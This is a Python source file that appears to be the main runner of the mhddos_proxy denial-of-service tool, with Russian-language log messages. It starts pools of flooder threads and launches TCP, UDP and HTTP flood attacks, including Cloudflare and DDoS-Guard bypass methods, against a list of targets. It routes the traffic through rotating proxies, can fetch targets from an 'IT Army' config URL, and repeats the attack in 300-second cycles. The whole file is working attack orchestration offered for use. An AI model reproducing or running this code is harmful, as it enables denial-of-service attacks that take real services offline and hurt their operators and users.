# @formatter:off
import colorama; colorama.init()
# @formatter:on
from itertools import cycle
from queue import SimpleQueue
import random
import time
from threading import Event, Thread
from typing import Any, Generator, List

from src.cli import init_argparse
from src.concurrency import DaemonThreadPool
from src.core import (
    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
    DNS_WORKERS, Params, Stats, PADDING_THREADS, ONLY_MY_IP
)
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main
from src.output import show_statistic, print_banner, print_progress
from src.proxies import update_proxies, NoProxy
from src.system import fix_ulimits, is_latest_version
from src.targets import Targets


def cycle_shuffled(container: List[Any]) -> Generator[Any, None, None]:
    ind = list(range(len(container)))
    random.shuffle(ind)
    for next_ind in cycle(ind):
        yield container[next_ind]


class Flooder(Thread):
    def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
        super(Flooder, self).__init__(daemon=True)
        self._switch_after = switch_after
        self._queue = SimpleQueue()

    def enqueue(self, event, args_list):
        self._queue.put((event, args_list))
        return self

    def run(self):
        """
        The logic here is the following:

         1) pick up random target to attack
         2) run a single session, receive back number of packets being sent
         3) if session was "succesfull" (non zero packets), keep executing for
            {switch_after} number of cycles
         4) otherwise, go back to 1)

        The idea is that if a specific target doesn't work, the thread will
        pick another work to do (steal). The definition of "success" could be
        extended to cover more use cases.

        As an attempt to steal work happens after fixed number of cycles,
        one should be careful with the configuration. If each cycle takes too
        long (for example BYPASS or DBG attacks are used), the number should
        be set to be relatively small.

        To dealing stealing, set number of cycles to -1. Such scheduling will
        be equivalent to the scheduling that was used before the feature was
        introduced (static assignment).
        """
        while True:
            event, args_list = self._queue.get()
            event.wait()
            time.sleep(random.random())  # make sure all operations are desynchornized
            kwargs_iter = cycle_shuffled(args_list)
            while event.is_set():
                kwargs = next(kwargs_iter)
                runnable = mhddos_main(**kwargs)
                no_switch = self._switch_after == WORK_STEALING_DISABLED
                alive, cycles_left = True, self._switch_after
                while event.is_set() and (no_switch or alive):
                    try:
                        alive = runnable.run() > 0 and cycles_left > 0
                    except Exception:
                        alive = False
                    cycles_left -= 1


def run_flooders(num_threads, switch_after) -> List[Flooder]:
    threads = []
    for _ in range(num_threads):
        flooder = Flooder(switch_after)
        try:
            flooder.start()
            threads.append(flooder)
        except RuntimeError:
            break

    if not threads:
        logger.error(
            f'{cl.RED}Не удалось запустить атаку - исчерпан лимит потоков системы{cl.RESET}')
        exit()

    if len(threads) < num_threads:
        logger.warning(
            f"{cl.RED}Не удалось запустить все {num_threads} потоков - "
            f"только {len(threads)}{cl.RESET}")

    return threads


def run_ddos(
    proxies,
    targets,
    tcp_flooders,
    udp_flooders,
    period,
    rpc,
    http_methods,
    use_my_ip,
    debug,
    table,
):
    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []

    def get_proxy():
        if use_my_ip == ONLY_MY_IP:
            return NoProxy
        if use_my_ip != 0 and random.random() * 100 <= use_my_ip:
            return NoProxy
        return random.choice(proxies)

    def register_params(params, container):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': event,
            'stats': thread_statistics,
            'get_proxy': get_proxy,
        }
        container.append(kwargs)
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуем цель:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )

    logger.info(f'{cl.GREEN}Запускаем атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        time.sleep(5)

    for target in targets:
        assert target.is_resolved, "Unresolved target cannot be used for attack"
        # udp://, method defaults to "UDP"
        if target.is_udp:
            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
        # Method is given explicitly
        elif target.method is not None:
            register_params(Params(target, target.method), kwargs_list)
        # tcp://
        elif target.url.scheme == "tcp":
            register_params(Params(target, 'TCP'), kwargs_list)
        # HTTP(S), methods from --http-methods
        elif target.url.scheme in {"http", "https"}:
            for method in http_methods:
                register_params(Params(target, method), kwargs_list)
        else:
            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")

    for flooder in tcp_flooders:
        flooder.enqueue(event, kwargs_list)

    if udp_kwargs_list:
        for flooder in udp_flooders:
            flooder.enqueue(event, udp_kwargs_list)

    event.set()

    if not (table or debug):
        print_progress(period, len(proxies), use_my_ip)
        time.sleep(period)
    else:
        cycle_start = time.perf_counter()
        while True:
            time.sleep(5)
            passed = time.perf_counter() - cycle_start
            if passed > period:
                break
            show_statistic(statistics, table, use_my_ip, len(proxies), round(period - passed))

    event.clear()


def start(args):
    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
    print_banner(use_my_ip)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(f'{cl.RED}Работа метода {bypass} не гарантирована{cl.RESET}')

    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    proxies = []
    is_old_version = not is_latest_version()

    # padding threads are necessary to create a "safety buffer" for the
    # system that hit resources limitation when running main pools.
    # it will be deallocated as soon as all other threads are up and running.
    padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
    udp_flooders = run_flooders(args.udp_threads, WORK_STEALING_DISABLED)
    tcp_flooders = run_flooders(args.threads, args.switch_after)
    padding_threads.terminate_all()
    del padding_threads

    while True:
        if is_old_version:
            print(
                f'{cl.RED}! ЗАПУЩЕННАЯ НЕ ПОСЛЕДНЯЯ ВЕРСИЯ - ОБНОВИТЕСЬ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')

        while True:
            targets = list(targets_iter)
            if not targets:
                logger.error(f'{cl.RED}Не указаны никакие цели для атаки{cl.RESET}')
                exit()

            targets = resolve_all_targets(targets, dns_executor)
            targets = [target for target in targets if target.is_resolved]
            if targets:
                break
            else:
                logger.warning(
                    f'{cl.RED}Не найдено ни одной доступной цели – ждем 30 сек до следующей проверки{cl.RESET}')
                time.sleep(30)

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.YELLOW}RPC меньше чем {LOW_RPC}. Это может привести к падению производительности '
                f'из-за увеличения количества переподключений{cl.RESET}'
            )

        current_use_my_ip = use_my_ip
        if all(target.is_udp for target in targets):
            current_use_my_ip = ONLY_MY_IP

        if current_use_my_ip == ONLY_MY_IP:
            proxies = []
        else:
            proxies = list(update_proxies(args.proxies, proxies))

        period = 300
        run_ddos(
            proxies,
            targets,
            tcp_flooders,
            udp_flooders,
            period,
            args.rpc,
            args.http_methods,
            current_use_my_ip,
            args.debug,
            args.table,
        )


if __name__ == '__main__':
    try:
        start(init_argparse().parse_args())
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершаем работу...{cl.RESET}')
